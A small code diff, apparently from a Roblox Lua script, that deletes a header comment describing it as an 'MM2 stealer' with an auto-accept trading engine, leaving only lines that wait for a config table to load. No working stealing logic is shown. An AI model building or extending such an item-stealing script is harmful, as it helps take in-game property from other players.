@@ -1,9 +1,3 @@
---[[ 
-    🍪 BISCUIT | MM2 STEALER FULL SOURCE
-    - Complete Trading Engine (State Checks, Auto-Accept)
-    - Supreme Value List Web Scraper
-]]
-
 if not _G["Script-SM_Config"] then
     warn("WARNING: Config not loaded! Waiting for config...")
     repeat task.wait() until _G["Script-SM_Config"]
